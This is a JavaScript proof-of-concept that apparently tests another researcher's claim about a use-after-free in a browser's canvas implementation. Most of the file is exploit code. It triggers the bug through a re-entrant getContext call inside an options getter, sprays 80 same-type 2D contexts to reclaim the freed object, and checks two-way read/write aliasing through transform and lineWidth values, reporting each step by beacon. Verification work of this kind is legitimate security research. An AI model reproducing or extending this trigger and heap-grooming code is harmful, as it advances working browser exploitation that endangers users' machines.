// c043: ZigZagBoi's canvas claim, tested on retail with our own beacons.
//
// Their p553 says "full bidirectional R/W via same-type reclaim, spray[9] alias". Their own limitations section
// says it is not arbitrary write (values pass through Canvas2D getters/setters) and that cross-type reclaim is
// dead - which is what IsoHeap ON looks like. So the testable part is: does a CanvasRenderingContext2D created
// after the free become an alias of the stale wrapper, and can we read/write that object's own fields both ways?
//
// No sanitizer here, so every step beacons, and the last beacon is the result.
(function () {
  function send(s) { try { navigator.sendBeacon('/beacon', 'c043-' + String(s)); } catch (e) {} }
  send('boot');

  var cv = document.createElement('canvas'); cv.width = 8; cv.height = 8; document.body.appendChild(cv);
  var inner = null, outer = null;
  var opts = {};
  Object.defineProperty(opts, 'alpha', {
    get: function () { try { inner = cv.getContext('2d'); } catch (e) {} send('getter inner=' + !!inner); return true; }
  });
  try { outer = cv.getContext('bitmaprenderer', opts); }
  catch (e) { send('outer-threw:' + e.name); }
  send('trigger inner=' + !!inner + ' outer=' + !!outer + ' same=' + (inner === outer));
  if (!inner) { send('no-inner'); return; }

  var S = [11.110011, 22.220022, 33.330033, 44.440044, 55.550055, 66.660066];
  try { var t0 = inner.getTransform(); send('pre a=' + t0.a + ' e=' + t0.e); }
  catch (e) { send('pre-threw:' + e.name); }

  // same-type spray: the only class that can take a Canvas2D slot if IsoHeap is on
  var spray = [];
  for (var i = 0; i < 80; i++) {
    try {
      var c = document.createElement('canvas'); c.width = 8; c.height = 8; document.body.appendChild(c);
      var x = c.getContext('2d'); x.setTransform(S[0], S[1], S[2], S[3], S[4], S[5]);
      spray.push(x);
    } catch (e) { break; }
  }
  send('sprayed=' + spray.length);

  // read back through the stale wrapper
  try {
    var t = inner.getTransform();
    send('stale a=' + t.a + ' b=' + t.b + ' e=' + t.e);
    send('CHANNEL ' + ((t.a === S[0] && t.e === S[4]) ? 'sentinel-match' : 'no-match'));
  } catch (e) { send('stale-threw:' + e.name); }

  // write through the stale wrapper, then find which spray context sees it
  try { inner.setTransform(99.001, 88.002, 77.003, 66.004, 55.005, 44.006); }
  catch (e) { send('write-threw:' + e.name); }
  var found = -1;
  for (var j = 0; j < spray.length; j++) {
    try { var u = spray[j].getTransform(); if (u.a === 99.001 && u.e === 55.005) { found = j; break; } } catch (e) {}
  }
  send('alias=' + found);

  // reverse direction: write through the spray member, read through the stale wrapper
  if (found >= 0) {
    try { spray[found].setTransform(1.23, 4.56, 7.89, 10.11, 12.13, 14.15); } catch (e) {}
    try { var v = inner.getTransform(); send('reverse a=' + v.a + ' e=' + v.e + ' ' + ((v.a === 1.23) ? 'REVERSE-OK' : 'reverse-no')); }
    catch (e) { send('reverse-threw'); }
  }

  // numeric properties, the other half of their claim
  try { inner.lineWidth = 31337.5; inner.globalAlpha = 0.42; } catch (e) { send('prop-threw'); }
  var pl = -1;
  for (var k = 0; k < spray.length; k++) { try { if (spray[k].lineWidth === 31337.5) { pl = k; break; } } catch (e) {} }
  send('prop-lineWidth-alias=' + pl);
  send('ALIVE');
})();
